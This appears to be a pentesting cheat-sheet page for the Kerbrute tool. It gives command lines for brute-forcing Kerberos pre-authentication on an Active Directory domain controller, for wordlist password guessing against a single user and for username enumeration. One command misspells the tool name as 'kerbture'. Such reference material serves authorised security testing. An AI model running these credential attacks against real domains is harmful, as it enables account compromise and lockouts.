---
title: Kerbrute
desc: Bruteforcing Kerberos pre-auth.
tags: [ActiveDirectory, BruteForce, Linux, Windows]
alts: [Impacket]
website: https://github.com/ropnop/kerbrute
render_with_liquid: false
---

## Bruteforce username:password

```sh
kerbrute bruteforce --dc 10.0.0.1 -d example.domain /path/to/combos.txt

# combos.txt example:
# username:password
# admin:admin
# wiener:peter
```

<br />

## Bruteforce user's password

```sh
kerbture bruteuser --dc 10.0.0.1 -d example.domain /usr/share/wordlists/rockyou.txt username
```

<br />

## Enumerate users

```sh
# Get users (--dc: the location of domain controller, -d: domain name)
kerbrute userenum --dc 10.0.0.1 -d example.local /usr/share/wordlists/username.txt
```
